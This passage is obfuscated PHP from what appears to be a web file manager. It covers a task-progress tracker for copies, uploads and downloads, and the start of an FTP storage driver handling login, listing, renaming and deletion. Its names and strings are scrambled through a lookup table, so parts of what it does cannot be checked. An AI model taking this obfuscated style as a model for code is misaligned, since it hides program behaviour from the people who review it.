($ƒÍšŠóí[$ñ—„öõ¶[1980]] == $ñ—„öõ¶[1331]) { $ƒÍšŠóí[$ñ—„öõ¶[1983]] = $ƒÍšŠóí[$ñ—„öõ¶[1982]] + $ƒÍšŠóí[$ñ—„öõ¶[1979]] * 0.5; } else { if ($ƒÍšŠóí[$ñ—„öõ¶[1980]] == $ñ—„öõ¶[119]) { $ƒÍšŠóí[$ñ—„öõ¶[1983]] = $ƒÍšŠóí[$ñ—„öõ¶[1982]] + $ƒÍšŠóí[$ñ—„öõ¶[1978]] * 0.5 + $ƒÍšŠóí[$ñ—„öõ¶[1979]] * 0.5; } } } } $ƒÍšŠóí[$ñ—„öõ¶[1926]] = $ƒÍšŠóí[$ñ—„öõ¶[1983]] / $ƒÍšŠóí[$ñ—„öõ¶[865]]; if ($ƒÍšŠóí[$ñ—„öõ¶[1926]] > 0) { $ùÙ÷‡èŸ = timeFloat() - $ƒÍšŠóí[$ñ—„öõ¶[1928]] - $ƒÍšŠóí[$ñ—„öõ¶[1931]]; $ƒÍšŠóí[$ñ—„öõ¶[1932]] = $ùÙ÷‡èŸ * (1 - $ƒÍšŠóí[$ñ—„öõ¶[1926]]) / $ƒÍšŠóí[$ñ—„öõ¶[1926]]; } $è¸²áÚ = $ƒÍšŠóí[$ñ—„öõ¶[1979]] . $ñ—„öõ¶[948] . $ƒÍšŠóí[$ñ—„öõ¶[1978]] . "\73\40{$¤…±‰Ê·}\x3b" . $ƒÍšŠóí[$ñ—„öõ¶[1983]]; self::log($ñ—„öõ¶[1988] . $ƒÍšŠóí[$ñ—„öõ¶[1980]] . $ñ—„öõ¶[85] . $ƒÍšŠóí[$ñ—„öõ¶[1926]] . $ñ—„öõ¶[85] . $è¸²áÚ); } public function addPath($£Šå ôˆ) { $´¡¹ĞŸ÷ =& $_SERVER[¤øïŠ‹²]; if (!$£Šå ôˆ) { return; } $Öşèúá =& $this->task; $ŒºŞŒ° = IO::infoWithChildren($£Šå ôˆ); $ ÙìÙ˜ = $Öşèúá[$´¡¹ĞŸ÷[1989]] ? $Öşèúá[$´¡¹ĞŸ÷[1989]][$´¡¹ĞŸ÷[1990]] : 0; $Öşèúá[$´¡¹ĞŸ÷[1989]] = array($´¡¹ĞŸ÷[1990] => $ ÙìÙ˜ + 1, $´¡¹ĞŸ÷[515] => $ŒºŞŒ°[$´¡¹ĞŸ÷[32]], $´¡¹ĞŸ÷[98] => $ŒºŞŒ°[$´¡¹ĞŸ÷[98]], $´¡¹ĞŸ÷[608] => $ŒºŞŒ°[$´¡¹ĞŸ÷[608]] ? $ŒºŞŒ°[$´¡¹ĞŸ÷[608]] : $ŒºŞŒ°[$´¡¹ĞŸ÷[98]]); if ($ŒºŞŒ°[$´¡¹ĞŸ÷[33]] == $´¡¹ĞŸ÷[243]) { $Öşèúá[$´¡¹ĞŸ÷[1178]] += 1; } else { $Öşèúá[$´¡¹ĞŸ÷[1178]] += $ŒºŞŒ°[$´¡¹ĞŸ÷[93]][$´¡¹ĞŸ÷[91]]; if ($ŒºŞŒ°[$´¡¹ĞŸ÷[204]]) { $Öşèúá[$´¡¹ĞŸ÷[1178]] += $ŒºŞŒ°[$´¡¹ĞŸ÷[93]][$´¡¹ĞŸ÷[92]] + 1; } } $Öşèúá[$´¡¹ĞŸ÷[865]] += $ŒºŞŒ°[$´¡¹ĞŸ÷[90]]; $this->update(); self::log(array($´¡¹ĞŸ÷[1991] . $£Šå ôˆ, $ŒºŞŒ°)); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($êÚŠøÇ™) { } public function sourceAddHashEnd($™æüÌÜÏ) { } public function sourceAddFileStart($™´ÇÛºÆ) { $¹ÏÄÌ¸„ =& $_SERVER[¤øïŠ‹²]; $øãØÕıæ =& $this->task; $øãØÕıæ[$¹ÏÄÌ¸„[1978]] = $™´ÇÛºÆ[$¹ÏÄÌ¸„[90]]; $øãØÕıæ[$¹ÏÄÌ¸„[1976]] = $™´ÇÛºÆ[$¹ÏÄÌ¸„[32]]; $øãØÕıæ[$¹ÏÄÌ¸„[1180]] = $™´ÇÛºÆ[$¹ÏÄÌ¸„[32]]; $øãØÕıæ[$¹ÏÄÌ¸„[1992]] = $™´ÇÛºÆ[$¹ÏÄÌ¸„[98]]; $this->update(); self::log($¹ÏÄÌ¸„[1993] . $™´ÇÛºÆ[$¹ÏÄÌ¸„[98]] . $¹ÏÄÌ¸„[1994] . $™´ÇÛºÆ[$¹ÏÄÌ¸„[90]]); } public function sourceAddFileEnd($Å’›È°Ô) { $–ğõ‘Åé =& $_SERVER[¤øïŠ‹²]; $³±£„ê¤ =& $this->task; $³±£„ê¤[$–ğõ‘Åé[1983]] += $Å’›È°Ô[$–ğõ‘Åé[90]]; $³±£„ê¤[$–ğõ‘Åé[1992]] = $Å’›È°Ô[$–ğõ‘Åé[98]]; $this->update(1); self::log($–ğõ‘Åé[1995] . $Å’›È°Ô[$–ğõ‘Åé[98]] . $–ğõ‘Åé[1994] . $Å’›È°Ô[$–ğõ‘Åé[90]] . $–ğõ‘Åé[1996]); } public function copyFileStart($˜°öˆÖµ, $‰ÓúõŠù, $¤ŞÊàÀ“, $˜ˆõĞ¿±, $Óõ¾Ûæ, $Ä‹õçÙ) { $Ëİ…ö…¢ =& $_SERVER[¤øïŠ‹²]; $¬­‰ùÚ = $Óõ¾Ûæ; if ($¬­‰ùÚ == $GLOBALS[$Ëİ…ö…¢[1997]]) { $¬­‰ùÚ = $GLOBALS[$Ëİ…ö…¢[1998]]; } $GLOBALS[$Ëİ…ö…¢[1998]] = $Óõ¾Ûæ; $GLOBALS[$Ëİ…ö…¢[1997]] = $Ä‹õçÙ; $«´šªáØ =& $this->task; $«´šªáØ[$Ëİ…ö…¢[1976]] = $¬­‰ùÚ; $«´šªáØ[$Ëİ…ö…¢[1978]] = (int) $˜°öˆÖµ->size($‰ÓúõŠù); $«´šªáØ[$Ëİ…ö…¢[1979]] = 0; $«´šªáØ[$Ëİ…ö…¢[1180]] = $Ëİ…ö…¢[12]; $«´šªáØ[$Ëİ…ö…¢[1980]] = $Ëİ…ö…¢[12]; $«´šªáØ[$Ëİ…ö…¢[1981]] = 0; $·è±é… = $«´šªáØ[$Ëİ…ö…¢[1978]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($«´šªáØ[$Ëİ…ö…¢[493]] . $Ëİ…ö…¢[1999]); if ($·è±é… && file_exists(get_path_father($˜ˆõĞ¿±))) { Cache::set($«´šªáØ[$Ëİ…ö…¢[493]] . $Ëİ…ö…¢[1999], $˜ˆõĞ¿±); $«´šªáØ[$Ëİ…ö…¢[1949]] = array($Ëİ…ö…¢[2000], $Ëİ…ö…¢[2001]); } $this->update(0, $·è±é…); self::log("\x63\157\160\x79\x46\151\x6c\145\x53\164\141\x72\164\72{$‰ÓúõŠù}\x3b"); } public static function updateCopyLocalFileSize($ÛƒèÇİ) { $£‚æ®ù =& $_SERVER[¤øïŠ‹²]; $İØÜ® ı = Cache::get($ÛƒèÇİ[$£‚æ®ù[493]] . $£‚æ®ù[1999]); if (!$İØÜ® ı || !file_exists($İØÜ® ı)) { return $ÛƒèÇİ; } $ÛƒèÇİ[$£‚æ®ù[1979]] = @filesize($İØÜ® ı); $ÛƒèÇİ[$£‚æ®ù[1983]] += $ÛƒèÇİ[$£‚æ®ù[1979]]; self::updateTask($ÛƒèÇİ); return $ÛƒèÇİ; } public function copyFileEnd($×òÈĞİ, $¢ú¾€†, $†Ìï³Õ£, $®µäÊø¯, $¯î‘×±, $€µöŸÏ) { $öˆ­„ÖÚ =& $_SERVER[¤øïŠ‹²]; $Ûô„ààæ =& $this->task; $Ûô„ààæ[$öˆ­„ÖÚ[1979]] = $Ûô„ààæ[$öˆ­„ÖÚ[1978]]; $Ûô„ààæ[$öˆ­„ÖÚ[1980]] = $öˆ­„ÖÚ[12]; unset($Ûô„ààæ[$öˆ­„ÖÚ[1949]]); if ($¯î‘×± == $Ûô„ààæ[$öˆ­„ÖÚ[1976]]) { $Ûô„ààæ[$öˆ­„ÖÚ[1982]] += $Ûô„ààæ[$öˆ­„ÖÚ[1978]]; $Ûô„ààæ[$öˆ­„ÖÚ[1983]] = $Ûô„ààæ[$öˆ­„ÖÚ[1982]]; $ãöÊóéı = 1; if (isset($Ûô„ààæ[$öˆ­„ÖÚ[1992]]) && $Ûô„ààæ[$öˆ­„ÖÚ[1992]] == $¢ú¾€†) { $ãöÊóéı = 0; } $this->update($ãöÊóéı); } else { $this->update(); $Ûô„ààæ[$öˆ­„ÖÚ[1979]] = 0; } Cache::remove($Ûô„ààæ[$öˆ­„ÖÚ[493]] . $öˆ­„ÖÚ[1999]); self::log($öˆ­„ÖÚ[2002] . $¢ú¾€† . $öˆ­„ÖÚ[84] . $®µäÊø¯ . $öˆ­„ÖÚ[59] . $¯î‘×± . $öˆ­„ÖÚ[2003] . $Ûô„ààæ[$öˆ­„ÖÚ[1976]]); } public function updateFileEnd($ß¹•İÔ, $ÑÄîœˆ) { $„í¾ˆÚ© =& $_SERVER[¤øïŠ‹²]; $™Éï´Õí =& $this->task; $™Éï´Õí[$„í¾ˆÚ©[1976]] = $ß¹•İÔ; $™Éï´Õí[$„í¾ˆÚ©[1978]] = $ÑÄîœˆ; $™Éï´Õí[$„í¾ˆÚ©[1982]] += $ÑÄîœˆ; $™Éï´Õí[$„í¾ˆÚ©[1983]] = $™Éï´Õí[$„í¾ˆÚ©[1982]]; $this->update(1); self::log($„í¾ˆÚ©[2004] . $ß¹•İÔ); } public function sourceModelCopy($‡…Ã‚ÉŸ) { $Ñâó½‘Ç =& $_SERVER[¤øïŠ‹²]; $Íİ—ÚõÀ = $‡…Ã‚ÉŸ[0]; $ŸüˆìÚ… = $‡…Ã‚ÉŸ[1]; $ä¯ï‰¯ =& $this->task; $this->sourceModelCopyFlag = !0; $Ë¼Ø‘Í = 0; switch ($Íİ—ÚõÀ) { case $Ñâó½‘Ç[664]: $Ë¼Ø‘Í = 1; break; case $Ñâó½‘Ç[667]: $ä¯ï‰¯[$Ñâó½‘Ç[1976]] = $ŸüˆìÚ…[$Ñâó½‘Ç[32]]; break; case $Ñâó½‘Ç[669]: $Ë¼Ø‘Í = intval($‡…Ã‚ÉŸ[$Ñâó½‘Ç[477]] * 0.4); break; case $Ñâó½‘Ç[671]: $Ë¼Ø‘Í = intval($‡…Ã‚ÉŸ[$Ñâó½‘Ç[477]] * 0.2); break; case $Ñâó½‘Ç[673]: $Ë¼Ø‘Í = intval($‡…Ã‚ÉŸ[$Ñâó½‘Ç[477]] * 0.4); break; } $this->update($Ë¼Ø‘Í); self::log(array("{$Íİ—ÚõÀ}\73\x61\x64\x64\x3d{$Ë¼Ø‘Í}", $‡…Ã‚ÉŸ)); $this->sourceModelCopyFlag = !1; } public function sourceRemove($Àôå©À’, $ÎæŸØ½İ) { $ÄØÚ£”é =& $_SERVER[¤øïŠ‹²]; $this->sourceModelCopyFlag = !0; $‰„“Ä³ş = 1; if (isset($Àôå©À’[$ÄØÚ£”é[93]])) { $‰„“Ä³ş = $Àôå©À’[$ÄØÚ£”é[93]][$ÄØÚ£”é[91]]; $‰„“Ä³ş = $‰„“Ä³ş + $Àôå©À’[$ÄØÚ£”é[93]][$ÄØÚ£”é[92]] + 1; } $this->update($‰„“Ä³ş); $this->sourceModelCopyFlag = !1; $this->log(array($ÄØÚ£”é[2005], $‰„“Ä³ş, $Àôå©À’)); } public function sourceMove($Ûôíş) { $this->sourceRemove($Ûôíş, !1); } public function curlProgress($èØ¼µ«Œ, $ªª·˜¢, $¤›¿ä†¹, $‡îÑ‘Üâ, $òÉöƒ‹ƒ) { $‘ãÃá­° =& $_SERVER[¤øïŠ‹²]; $†İ¤ËÆ› =& $this->task; if ($òÉöƒ‹ƒ > 0) { $†İ¤ËÆ›[$‘ãÃá­°[1180]] = $‘ãÃá­°[2006]; $†İ¤ËÆ›[$‘ãÃá­°[1980]] = $‘ãÃá­°[119]; if ($†İ¤ËÆ›[$‘ãÃá­°[1978]]) { $†İ¤ËÆ›[$‘ãÃá­°[1979]] = $òÉöƒ‹ƒ; } if ($†İ¤ËÆ›[$‘ãÃá­°[1981]]) { $†İ¤ËÆ›[$‘ãÃá­°[1979]] = $òÉöƒ‹ƒ + $†İ¤ËÆ›[$‘ãÃá­°[1981]]; } } else { if ($¤›¿ä†¹ > 0) { if ($†İ¤ËÆ›[$‘ãÃá­°[1978]] == $ªª·˜¢) { $†İ¤ËÆ›[$‘ãÃá­°[1979]] = $¤›¿ä†¹; $†İ¤ËÆ›[$‘ãÃá­°[1180]] = $‘ãÃá­°[2007]; $†İ¤ËÆ›[$‘ãÃá­°[1980]] = $‘ãÃá­°[1331]; } } } $this->update(); $Ø÷µòÕ¤ = "\x64\x6f\167\x6e\72{$¤›¿ä†¹}\57{$ªª·˜¢}\73\x20\x75\x70\154\x6f\141\144\72{$òÉöƒ‹ƒ}\x2f{$‡îÑ‘Üâ}\73\x66\x69\154\145\75" . $†İ¤ËÆ›[$‘ãÃá­°[1978]]; self::log(array($‘ãÃá­°[2008] . $Ø÷µòÕ¤ . $‘ãÃá­°[85] . $†İ¤ËÆ›[$‘ãÃá­°[1976]], curl_getinfo($èØ¼µ«Œ))); } public function curlProgressStart($Ç™‚Ä˜ú) { } public function curlProgressEnd($Œ×·ìŒ”) { $…ÊÌå÷ñ =& $_SERVER[¤øïŠ‹²]; $Á•Ü¿åä =& $this->task; $˜•”Ëüı = curl_getinfo($Œ×·ìŒ”); $„¨„Äı = $˜•”Ëüı[$…ÊÌå÷ñ[2009]]; if ($„¨„Äı == -1) { $„¨„Äı = $˜•”Ëüı[$…ÊÌå÷ñ[2010]]; } if ($Á•Ü¿åä[$…ÊÌå÷ñ[1980]] == $…ÊÌå÷ñ[119] && $„¨„Äı) { $Á•Ü¿åä[$…ÊÌå÷ñ[1981]] += $„¨„Äı; } $this->update(); } } goto d–ô•‘Û§Ï; f©—œíá : class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($ªòã¹¦ß) { parent::__construct(); if (count($ªòã¹¦ß) > 0) { $this->_init($ªòã¹¦ß); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ˆ†ö¿”È) { $ôÂªè²ö =& $_SERVER[¤øïŠ‹²]; global $config; $this->appCharset = $config[$ôÂªè²ö[1595]]; $this->systemCharset = $config[$ôÂªè²ö[1596]]; if (isset($ˆ†ö¿”È[$ôÂªè²ö[1597]]) && $ˆ†ö¿”È[$ôÂªè²ö[1597]]) { $this->systemCharset = $ˆ†ö¿”È[$ôÂªè²ö[1597]]; } } public function iconvApp($º¸—àøı) { return $this->iconvTo($º¸—àøı, $this->systemCharset, $this->appCharset); } public function iconvSystem($å¸ïğë¶) { return $this->iconvTo($å¸ïğë¶, $this->appCharset, $this->systemCharset); } public function getPathOuter($›™‚ÚÊ”) { $Å€›ğâ =& $_SERVER[¤øïŠ‹²]; $“©ÇÛì½ = $this->iconvApp($this->pathBase); $›™‚ÚÊ” = $this->iconvApp($›™‚ÚÊ”); if (substr($“©ÇÛì½, 0, 2) == $Å€›ğâ[1472]) { $“©ÇÛì½ = BASIC_PATH . substr($“©ÇÛì½, 2); } if (substr($›™‚ÚÊ”, 0, 2) == $Å€›ğâ[1472]) { $›™‚ÚÊ” = BASIC_PATH . substr($›™‚ÚÊ”, 2); } $“©ÇÛì½ = KodIO::clear($“©ÇÛì½); $›™‚ÚÊ” = KodIO::clear($›™‚ÚÊ”); $›™‚ÚÊ” = substr($›™‚ÚÊ”, strlen($“©ÇÛì½)); if (empty($this->pathDriver)) { return $›™‚ÚÊ”; } return $this->pathDriver . $Å€›ğâ[8] . ltrim($›™‚ÚÊ”, $Å€›ğâ[8]); } private function _init($´¯ÑÊ‚ = array()) { $”ÔÆÖä¼ =& $_SERVER[¤øïŠ‹²]; if (!function_exists($”ÔÆÖä¼[1598])) { throw new Exception(LNG($”ÔÆÖä¼[1599])); } $this->config = $´¯ÑÊ‚; $this->charsetReset($´¯ÑÊ‚); foreach ($´¯ÑÊ‚ as $¡¢ÂÈ÷ô => $»ÊíÀìØ) { if (isset($this->{$¡¢ÂÈ÷ô})) { $this->{$¡¢ÂÈ÷ô} = $»ÊíÀìØ; } } return $this->_login($´¯ÑÊ‚); } private function _login($ò¾ğŠ½) { $¹Å±â°Õ =& $_SERVER[¤øïŠ‹²]; static $ĞÍÕ£¼Ú = array(); $­¾Ü“¿¼ = md5(json_encode($ò¾ğŠ½)); if (isset($ĞÍÕ£¼Ú[$­¾Ü“¿¼])) { foreach ($ĞÍÕ£¼Ú[$­¾Ü“¿¼] as $·¢ÙÛ¨ñ => $ëËàÍ»•) { $this->{$·¢ÙÛ¨ñ} = $ëËàÍ»•; } return !0; } $’š°’¤„ = parse_url(trim($this->server, $¹Å±â°Õ[8])); $this->host = $’š°’¤„[$¹Å±â°Õ[219]]; $ş»ê—‡¢ = isset($’š°’¤„[$¹Å±â°Õ[218]]) && $’š°’¤„[$¹Å±â°Õ[218]] == $¹Å±â°Õ[1600] ? !0 : !1; $this->scheme = $ş»ê—‡¢ ? $¹Å±â°Õ[1601] : $¹Å±â°Õ[1602]; $this->port = isset($’š°’¤„[$¹Å±â°Õ[220]]) ? $’š°’¤„[$¹Å±â°Õ[220]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($¹Å±â°Õ[1603]) . $this->host . $¹Å±â°Õ[4] . $this->port, !0); return !1; } $ûÀ×öğà = @ftp_login($this->connect, $this->username, $this->userpass); if (!$ûÀ×öğà) { $this->writeLog(LNG($¹Å±â°Õ[1604]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $¹Å±â°Õ[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ê¯©‘†¸ = $this->pasv == $¹Å±â°Õ[102] ? !0 : !1; @ftp_pasv($this->connect, $ê¯©‘†¸); $ĞÍÕ£¼Ú[$­¾Ü“¿¼] = array($¹Å±â°Õ[1605] => $this->connect, $¹Å±â°Õ[219] => $this->host, $¹Å±â°Õ[218] => $this->scheme, $¹Å±â°Õ[220] => $this->port); return $ûÀ×öğà; } private function _isconn($êÃÀÀ¹ = true) { if (is_resource($this->connect)) { return !0; } if (!$êÃÀÀ¹) { return !1; } return $this->_login($this->config); } public function mkfile($±¾ó®£Ç, $äß†ğ­Û = '', $êàÚşí = REPEAT_RENAME) { if ($this->setContent($±¾ó®£Ç, $äß†ğ­Û)) { return $this->getPathOuter($±¾ó®£Ç); } $this->writeLog(LNG($_SERVER[¤øïŠ‹²][1606]), !0); return !1; } public function mkdir($ˆµËÆ×‡, $û¶ÄÑ¤ = REPEAT_SKIP) { $’ş‡¼‹» =& $_SERVER[¤øïŠ‹²]; if (!$ˆµËÆ×‡ || $ˆµËÆ×‡ == $’ş‡¼‹»[8]) { return !0; } if (!$this->_isconn()) { return !1; } $ˆµËÆ×‡ = $this->iconvSystem($ˆµËÆ×‡); if ($this->_isFolder($ˆµËÆ×‡) || @ftp_mkdir($this->connect, $ˆµËÆ×‡)) { return $this->getPathOuter($ˆµËÆ×‡); } if (!$this->mkdir($this->pathFather($ˆµËÆ×‡))) { return !1; } if ($ˆµËÆ×‡ = @ftp_mkdir($this->connect, $ˆµËÆ×‡)) { return $this->getPathOuter($ˆµËÆ×‡); } $üæêÕİ = __FUNCTION__ . $’ş‡¼‹»[1607]; $this->writeLog($üæêÕİ, !0); return !1; } public function copyFile($«éœó´´, $ËÑ«€ºŸ) { if (!$this->_isconn()) { return !1; } $‚Ğê ò— = $this->pathThis($this->iconvSystem($«éœó´´)); $¿ïÅ¯Ç = $this->tempFile($‚Ğê ò—); $ÍµÓèúæ = $this->iconvApp($¿ïÅ¯Ç); $this->download($«éœó´´, $ÍµÓèúæ); $û§ˆüËª = $this->upload($ËÑ«€ºŸ, $ÍµÓèúæ); $this->tempFileRemve($¿ïÅ¯Ç); return $û§ˆüËª; } public function moveFile($”“”äÊÃ, $š¥•‡ü) { if (!$this->_isconn()) { return !1; } $”“”äÊÃ = $this->iconvSystem($”“”äÊÃ); $š¥•‡ü = $this->iconvSystem($š¥•‡ü); $·¨»Ûó‡ = @ftp_rename($this->connect, $”“”äÊÃ, $š¥•‡ü); if (!$·¨»Ûó‡) { $this->writeLog(__FUNCTION__ . $_SERVER[¤øïŠ‹²][1607], !0); return !1; } return $this->getPathOuter($š¥•‡ü); } public function delFile($ãÄúì…) { if (!$this->_isconn()) { return !1; } $ãÄúì… = $this->iconvSystem($ãÄúì…); $ùú¶óÒà = @ftp_delete($this->connect, $ãÄúì…); if (!$ùú¶óÒà) { $this->writeLog(__FUNCTION__ . $_SERVER[¤øïŠ‹²][1607], !0); } return $ùú¶óÒà; } public function delFolder($©‰ğµã™) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $àá¨Â„– = $Ëó„À“È = array(); $this->fileList($©‰ğµã™, $àá¨Â„–, $Ëó„À“È, !0); $this->listItemCache = !0; foreach ($Ëó„À“È as $‘á–ª’à) { $ôİíÉµ¬ = $this->iconvSystem($‘á–ª’à[$_SERVER[¤øïŠ‹²][32]]); $ù•ª÷¶£ = @ftp_delete($this->connect, $ôİíÉµ¬); if (!$ù•ª÷¶£) { return !1; } } foreach ($àá¨Â„– as $ôİíÉµ¬) { $ôİíÉµ¬ = $this->iconvSystem($ôİíÉµ¬); $ù•ª÷¶£ = @ftp_rmdir($this->connect, $ôİíÉµ¬); if (!$ù•ª÷¶£) { return !1; } } $©‰ğµã™ = $this->iconvSystem($©‰ğµã™); return @ftp_rmdir($this->connect, $©‰ğµã™); } public function rename($¯œ×µÉØ, $ê£’‡ü») { $••ñ¬äà =& $_SERVER[¤øïŠ‹²]; if (!$this->_isconn()) { return !1; } $¶â·£‡ = $this->fileNameAuto($this->pathFather($¯œ×µÉØ), $ê£’‡ü»); $¶â·£‡ = $this->iconvSystem($¶â·£‡); $¯œ×µÉØ = $this->iconvSystem($¯œ×µÉØ); $£ƒş¿É = $this->pathFather($¯œ×µÉØ); $¬’µ·Ï = rtrim($£ƒş¿É, $••ñ¬äà[8]) . $••ñ¬äà[8] . $¶â·£‡; $§¯šÇòï = @ftp_rename($this->connect, $¯œ×µÉØ, $¬’µ·Ï); if (!$§¯šÇòï) { $this->writeLog(__FUNCTION__ . $••ñ¬äà[1607], !0); return !1; } $¬’µ·Ï = $this->iconvApp($¬’µ·Ï); return $this->getPathOuter($¬’µ·Ï); } private function folderInfo($¨œÑŠÖ, $£÷ßï¶× = false) { $¬¾îÏÃ =& $_SERVER[¤øïŠ‹²]; $ğÏáÏ•ë = array($¬¾îÏÃ[32] => $this->pathThis($¨œÑŠÖ), $¬¾îÏÃ[98] => $this->getPathOuter($¬¾îÏÃ[8] . $¨œÑŠÖ), $¬¾îÏÃ[33] => $¬¾îÏÃ[89]); if ($£÷ßï¶×) { return $ğÏáÏ•ë; } $ğÏáÏ•ë[$¬¾îÏÃ[244]] = $ğÏáÏ•ë[$¬¾îÏÃ[99]] = 0; $ğÏáÏ•ë[$¬¾îÏÃ[245]] = $ğÏáÏ•ë[$¬¾îÏÃ[246]] = !0; return $ğÏáÏ•ë; } private function fileInfo($¨ŠõÍÁÆ, $Ğ—¨£é = false, $‰ÂÇ²³ = array()) { $ùá›³—Û =& $_SERVER[¤øïŠ‹²]; $â±„×Õ = array($ùá›³—Û[32] => $this->pathThis($¨ŠõÍÁÆ), $ùá›³—Û[98] => $this->getPathOuter($ùá›³—Û[8] . $¨ŠõÍÁÆ), $ùá›³—Û[33] => $ùá›³—Û[243], $ùá›³—Û[90] => isset($‰ÂÇ²³[$ùá›³—Û[90]]) ? $‰ÂÇ²³[$ùá›³—Û[90]] : 0, $ùá›³—Û[179] => $this->ext($¨ŠõÍÁÆ)); if ($Ğ—¨£é) { return $â±„×Õ; } $â±„×Õ[$ùá›³—Û[244]] = $â±„×Õ[$ùá›³—Û[99]] = 0; $â±„×Õ[$ùá›³—Û[245]] = $â±„×Õ[$ùá›³—Û[246]] = !0; $Ëæ§µ…ß = $this->iconvSystem($¨ŠõÍÁÆ); $â±„×Õ[$ùá›³—Û[99]] = @ftp_mdtm($this->connect, $Ëæ§µ…ß); if (empty($‰ÂÇ²³)) { $‰ÂÇ²³ = $this->objectMeta($¨ŠõÍÁÆ); if (!$‰ÂÇ²³) { return $â±„×Õ; } } $â±„×Õ[$ùá›³—Û[90]] = $‰ÂÇ²³[$ùá›³—Û[90]]; return $â±„×Õ; } public function size($Ÿû¥ó÷Æ) { $„Ê½µ…ë = $this->objectMeta($Ÿû¥ó÷Æ); return $„Ê½µ…ë ? $„Ê½µ…ë[$_SERVER[¤øïŠ‹²][90]] : 0; } public function info($Äíô„—í) { if ($this->isFile($Äíô„—í)) { return $this->fileInfo($Äíô„—í, 0); } else { if ($this->isFolder($Äíô„—í)) { return $this->folderInfo($Äíô„—í); } } return !1; } private function fileList($‰°ö¢©å, &$Éè¶íÖŞ, &$ÑÛ‚«ÇÖ, $§¹ï²ñ° = false) { $ŒÂÙ«œ› =& $_SERVER[¤øïŠ‹²]; $‰°ö¢©å = $this->iconvSystem($‰°ö¢©å); if (!$this->isFolder($‰°ö¢©å)) { return !1; } $‰°ö¢©å = rtrim($‰°ö¢©å, $ŒÂÙ«œ›[8]) . $ŒÂÙ«œ›[8]; check_abort(); $»®†”€‰ = @ftp_rawlist($this->connect, $‰°ö¢©å); if (!$»®†”€‰) { $»®†”€‰ = array(); } $ÛÙıƒ™ = array($ŒÂÙ«œ›[10] => 1, $ŒÂÙ«œ›[1417] => 1); foreach ($»®†”€‰ as $…İ®˜ìô) { $­¾¥ôµÕ = $this->_listItem($…İ®˜ìô); if ($­¾¥ôµÕ[0] == $ŒÂÙ«œ›[860]) { continue; } $ŸòôÛÆ€ = $­¾¥ôµÕ[8]; if (empty($ŸòôÛÆ€) && $ŸòôÛÆ€ !== $ŒÂÙ«œ›[241] || isset($ÛÙıƒ™[$ŸòôÛÆ€])) { continue; } $ŸòôÛÆ€ = $this->iconvApp($‰°ö¢©å . ltrim($ŸòôÛÆ€, $ŒÂÙ«œ›[8])); $â´¦Ñ× = array($ŒÂÙ«œ›[32] => $ŸòôÛÆ€, $ŒÂÙ«œ›[33] => $ŒÂÙ«œ›[243], $ŒÂÙ«œ›[90] => $­¾¥ôµÕ[4]); if (substr($…İ®˜ìô, 0, 1) == $ŒÂÙ«œ›[1608]) { $â´¦Ñ×[$ŒÂÙ«œ›[33]] = $ŒÂÙ«œ›[89]; $â´¦Ñ×[$ŒÂÙ«œ›[90]] = 0; } $›ÒÖÚ“Í = $â´¦Ñ×[$ŒÂÙ«œ›[33]] == $ŒÂÙ«œ›[89] ? !0 : !1; $this->cacheMethodInfoSet($ŸòôÛÆ€, $›ÒÖÚ“Í, $â´¦Ñ×); if ($›ÒÖÚ“Í) { $Éè¶íÖŞ[] = $ŸòôÛÆ€; if ($§¹ï²ñ°) { $this->fileList($ŸòôÛÆ€, $Éè¶íÖŞ, $ÑÛ‚«ÇÖ, $§¹ï²ñ°); } continue; } $ÑÛ‚«ÇÖ[] = $â´¦Ñ×; } $this->cacheMethodInfoSet($‰°ö¢©å, !0); } private function _listItem($¨İı©ä‚) { if (empty($¨İı©ä‚)) { return array(); } $ä“úïÜ¸ = preg_split($_SERVER[¤øïŠ‹²][1609], $¨İı©ä‚); if (count($ä“úïÜ¸) <= 9) { return $ä“úïÜ¸; } $ä“úïÜ¸[8] = trim(substr($¨İı©ä‚, strpos($¨İı©ä‚, $ä“úïÜ¸[7]) + strlen($ä“úïÜ¸[7]))); return array_splice($ä“úïÜ¸, 0, 9); } public function listPath($Œ‰¿èµ­, $æÃƒ³Ó = false) { $î”·Ùù¨ =& $_SERVER[¤øïŠ‹²]; if (!$this->_isconn()) { return !1; } $Ô«Ñª‘¸ = $³”û¡€ = array(); $this->fileList($Œ‰¿èµ­, $Ô«Ñª‘¸, $³”û¡€); foreach ($Ô«Ñª‘¸ as $Ãï›”ê => $Çî¨“¤ƒ) { $Ô«Ñª‘¸[$Ãï›”ê] = $this->folderInfo($Çî¨“¤ƒ, $æÃƒ³Ó); } foreach ($³”û¡€ as $Ãï›”ê => $Çî¨“¤ƒ) { $³”û¡€[$Ãï›”ê] = $this->fileInfo($Çî¨“¤ƒ[$î”·Ùù¨[32]], $æÃƒ³Ó, $Çî¨“¤ƒ); } return array($î”·Ùù¨[96] => $Ô«Ñª‘¸, $î”·Ùù¨[97] => $³”û¡€); } public function has($ÇĞ¹šÛ, $¤Ä†³É” = false, $™Õ™¤„« = true) { $êÌ—ğÀˆ =& $_SERVER[¤øïŠ‹²]; $ÂÛàÆ¢» = $Ôæ«ƒÎ£ = array(); $’‡Æ¡¶ = $¤Ä†³É” ? !0 : !1; $this->fileList($ÇĞ¹šÛ, $ÂÛàÆ¢», $Ôæ«ƒÎ£, $’‡Æ¡¶); if ($¤Ä†³É”) { return array($êÌ—ğÀˆ[252] => count($Ôæ«ƒÎ£), $êÌ—ğÀˆ[253] => count($ÂÛàÆ¢»)); } if ($™Õ™¤„«) { if (count($Ôæ«ƒÎ£)) { return !0; } } else { if (count($ÂÛàÆ¢»)) { return !0; } } return !1; } public function listAll($İ™°„ÈŞ) { $û³ˆÀä¥ =& $_SERVER[¤øïŠ‹²]; if (!$this->_isconn()) { return !1; } $›µ£ÂÛÑ = $¼°ûéûü = array(); $this->fileList($İ™°„ÈŞ, 